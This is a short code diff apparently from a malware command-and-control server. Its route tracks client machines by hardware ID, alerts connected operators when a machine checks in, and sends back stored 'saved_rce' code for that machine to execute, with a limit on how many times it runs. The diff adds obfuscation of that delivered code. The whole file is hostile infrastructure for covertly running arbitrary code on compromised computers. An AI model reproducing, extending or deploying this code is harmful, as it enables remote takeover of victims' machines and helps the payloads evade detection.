@@ -1,4 +1,4 @@
-const { getObfuscatedClientCode } = require('../../util/obfuscator.js');
+const { getObfuscatedClientCode, getObfuscatedCode } = require('../../util/obfuscator.js');
 const { getShortHwid } = require('../../util/util.js');
 
 const logger = require('../../util/logger');
@@ -15,13 +15,11 @@ module.exports = (app) => {
         if (newClient) app.sockets.forEach((socket) => socket.emit('clientAdded', hwid));
         else app.sockets.forEach((socket) => socket.emit('clientPinged', hwid));
 
-        // TODO: add auto obfuscation
-
         const result = app.db.prepare('SELECT * FROM saved_rce WHERE hwid = ? AND times_to_run != 0').get(hwid);
 
         if (result) {
             if (result.times_to_run != -1) app.db.prepare('UPDATE saved_rce SET times_to_run = ? WHERE hwid = ?').run(--result.times_to_run, hwid);
-            res.status(200).send(result.code);
+            res.status(200).send(getObfuscatedCode(result.code));
         } else res.status(200).send('');
     });
 
